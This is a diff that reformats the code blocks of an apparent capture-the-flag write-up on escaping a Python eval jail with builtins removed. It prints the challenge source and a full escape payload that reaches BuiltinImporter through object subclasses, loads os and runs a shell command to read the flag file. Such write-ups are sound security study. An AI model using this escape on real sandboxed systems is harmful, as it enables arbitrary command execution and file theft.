@@ -4,7 +4,7 @@
 Just a normal pyjail without builtins!
 
 ## Source code:
-```
+```python
 #!/usr/local/bin/python3
 print(eval(input('> '), {"__builtins__": {}}, {}))
 ```
@@ -56,4 +56,6 @@ var
 0
 ```
 Then finally it was just a case of changing the command to print the contents of the flag file for the final payload of:
-`[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("cat flag_LwAyYvKd")`
+```python
+[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("cat flag_LwAyYvKd")`
+```
